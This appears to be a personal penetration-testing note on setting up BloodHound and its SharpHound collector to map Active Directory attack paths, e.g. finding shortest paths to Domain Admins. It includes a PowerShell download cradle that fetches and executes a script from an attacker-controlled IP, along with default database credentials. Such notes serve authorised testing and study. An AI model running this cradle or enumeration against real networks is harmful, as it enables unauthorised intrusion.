---
tags:
  - tool
  - active_directory
---
# BloodHound

Reveal hidden relationships within AD

SharpHound - Official data collector for BloodHound, performs all enumeration automatically and outputs to .json files ([documentation](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html))

## Setup

### SharpHound

We first need to collect data from our target with [SharpHound](https://github.com/BloodHoundAD/SharpHound)

```bash
# Grab local collectors in kali

cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe .
```

```bash
# Import Sharphound.ps1
iex(new-object net.webclient).downloadstring("http://$OUR_IP/SharpHound.ps1")
Get-Help Invoke-BloodHound

# Execute Bloodhound
.\SharpHound.exe -c All --outputprefix "$USER_$DOMAIN"
Invoke-BloodHound -CollectionMethod All -OutputPrefix "$USER_$DOMAIN"
Invoke-BloodHound -CollectionMethod All -OutputPrefix "$USER_$DOMAIN"
```

### BloodHound

We can now run BloodHound

```bash
# Start neo4j (creds - neo4j:neo4j)
sudo neo4j start
firefox http://localhost:7474 &
```

```bash
# Start bloodhound
bloodhound
```

**Note:** You can clear the database from inside the bloodhound GUI at the bottom of "Database Info"

We can now use the `Upload Data` function on the right side of the GUI to upload the zip file, or drag-and-drop it into BloodHound's main window.

See [here](https://support.websoft9.com/en/docs/neo4j) if you forgot your password (I set mine to `Password123`)

## Analysis

- Start by marking owned targets
- We can now get a high level overview of the environment

`Find Shortest Paths to Domain Admins` (at the bottom of analysis tab)
